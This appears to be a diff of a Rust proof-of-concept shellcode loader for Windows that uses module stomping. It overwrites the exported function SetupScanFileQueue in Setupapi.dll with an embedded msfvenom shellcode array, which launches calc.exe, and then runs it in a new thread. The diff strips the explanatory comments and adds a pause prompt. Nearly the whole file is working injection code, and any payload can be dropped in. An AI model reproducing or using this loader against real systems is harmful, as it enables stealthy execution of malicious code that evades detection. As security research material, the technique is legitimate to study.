@@ -1,22 +1,19 @@
-use ::core::{ffi::c_void, mem::transmute, ptr::null_mut};
+use ::core::{ffi::c_void, mem::transmute};
 use ::std::io::{stdin, stdout, Read, Write};
-
 use ::windows::{
     core::PCSTR,
     Win32::{
         Foundation::{CloseHandle, GetLastError},
         System::{
-            LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA},
-            Memory::{VirtualProtect, PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS, PAGE_READWRITE},
+            LibraryLoader::{GetProcAddress, LoadLibraryA},
+            Memory::{VirtualProtect, PAGE_EXECUTE_READ, PAGE_READWRITE},
             Threading::{
                 CreateThread, WaitForSingleObject, INFINITE, THREAD_CREATE_RUN_IMMEDIATELY,
-                THREAD_CREATION_FLAGS,
             },
         },
     },
 };
 
-// $ msfvenom -a x64 --platform windows -p windows/x64/exec cmd='cmd.exe /c calc.exe' -f rust
 const SHELLCODE: [u8; 287] = [
     0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
     0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
@@ -38,20 +35,21 @@ const SHELLCODE: [u8; 287] = [
     0x78, 0x65, 0x20, 0x2f, 0x63, 0x20, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
 ];
 
-// sacrificial function and the module it is exported by 
 const T_MODULE: &str = "Setupapi.dll\0";
 const T_METHOD: &str = "SetupScanFileQueue\0";
 
-// writes a payload into the specified memory region 
+fn bp() {
+    let mut stdout = stdout();
+    stdout.write(b"[+] <enter> to continue...").unwrap();
+    stdout.flush().unwrap();
+
+    stdin().read(&mut [0]).unwrap();
+}
+
 fn write_payload(p_addr: *const c_void) -> bool {
     unsafe {
-        
-        // we set with `PAGE_READWRITE` here to rewrite memory, then change to `PAGE_EXECUTE_READ` 
-        // prior to execution
         let mut old_protect = PAGE_READWRITE;
         match VirtualProtect(p_addr, SHELLCODE.len(), PAGE_READWRITE, &mut old_protect) {
-            // this would be more succinct with a `VirtualProtect(...).is_err()` 
-            // check but what's done is done and i refuse to apologise for my actions
             Ok(_) => (),
             Err(err) => {
                 println!(
@@ -59,13 +57,12 @@ fn write_payload(p_addr: *const c_void) -> bool {
                     err,
                     GetLastError()
                 );
-                return false; // VirtualProtect RW failure
+                return false;
             }
         }
-        
+
         std::ptr::copy(SHELLCODE.as_ptr() as _, p_addr as _, SHELLCODE.len());
         match VirtualProtect(p_addr, SHELLCODE.len(), PAGE_EXECUTE_READ, &mut old_protect) {
-            // this also doesnt have to be a pattern matching block
             Ok(_) => (),
             Err(err) => {
                 println!(
@@ -73,12 +70,11 @@ fn write_payload(p_addr: *const c_void) -> bool {
                     err,
                     GetLastError()
                 );
-                return false; // VirtualProtect RX failure
+                return false;
             }
         }
 
-        // 
-        return true; 
+        return true;
     }
 }
 
@@ -87,31 +83,28 @@ fn main() {
     let sac_func: PCSTR = PCSTR::from_raw(T_METHOD.as_ptr());
 
     unsafe {
-        // retrieve handle to sacrificial DLL and the address of our sacrificial function
-        // within that DLL
         let h_module = LoadLibraryA(sac_module).unwrap();
         let proc_addr = GetProcAddress(h_module, sac_func).unwrap();
 
-        // i did this at like 4am, im sure there was a reason but also this seems like nonsense lol
         let abs_addr = h_module.0 as isize + (proc_addr as isize - h_module.0 as isize);
-        println!("[?] absolute addr of stompable function: '{:x?}'", abs_addr);
+        println!(
+            "[?] absolute addr of function '{}': '{:x?}'",
+            T_METHOD, abs_addr
+        );
         println!(
             "[?] fn addr as c_void ptr: '{:x?}'",
             abs_addr as *const c_void
         );
 
-        // this function writes the payload to the base address and then sets 
-        // protection to RX in one go
         if !write_payload(abs_addr as *const c_void) {
             panic!("[x] Unable to finish overwriting function.");
         }
+
         println!("[+] copied shellcode to ext module function.");
 
-        // cast address ptr to function (microsoft createthread nightmare type)
         let thread_entry: unsafe extern "system" fn(*mut c_void) -> u32 = { transmute(abs_addr) };
         println!("[*] set entry to {:?}", thread_entry);
 
-        // execute function in a new thread 
         let mut thread_id = 0;
         let h_thread = CreateThread(
             None,
@@ -123,13 +116,10 @@ fn main() {
         )
         .unwrap();
 
-        println!(
-            "[+] waiting on thread '{}' to complete...",
-            thread_id
-        );
+        println!("[+] waiting on thread (w/ id: {}) completion.", thread_id);
 
-        // :\
         WaitForSingleObject(h_thread, INFINITE);
         CloseHandle(h_thread).unwrap();
+        bp();
     }
 }
